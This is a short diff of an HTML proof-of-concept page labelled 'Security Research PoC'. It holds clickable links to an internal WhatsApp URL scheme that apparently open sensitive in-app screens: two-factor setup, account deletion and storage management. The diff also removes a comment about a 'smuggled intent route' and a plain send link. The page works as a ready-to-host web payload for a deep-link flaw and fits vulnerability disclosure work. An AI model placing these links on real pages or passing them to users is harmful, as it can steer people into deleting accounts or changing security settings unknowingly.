@@ -1,19 +1,8 @@
-<!-- Hosted on your website -->
 <html>
   <body>
     <h1>Security Research PoC</h1>
-    <!-- The browser will treat this as a standard deep link, which is fully valid -->
-    <a href="whatsapp://send?text=CheckThisOut">Click to Test Proxy</a>
-    
-    <!-- Or trigger the smuggled intent route directly -->
-    <a href="whatsapp-consumer://settings/account/2fa?continueTo=999">
-      Click to Trigger Internal 2FA Flow
-    </a>
-    <a href="whatsapp-consumer://settings/account/delete">
-      Click to Trigger Internal delete
-    </a>
-    <a href="whatsapp-consumer://settings/storage-management">
-      Click to Trigger storage
-    </a>
+    <a href="whatsapp-consumer://settings/account/2fa?continueTo=999">Click to Trigger Internal 2FA Flow</a>
+    <a href="whatsapp-consumer://settings/account/delete">Click to Trigger Internal Delete Account Flow</a>
+    <a href="whatsapp-consumer://settings/storage-management">Click to Trigger Internal Storage Management</a>
   </body>
 </html>
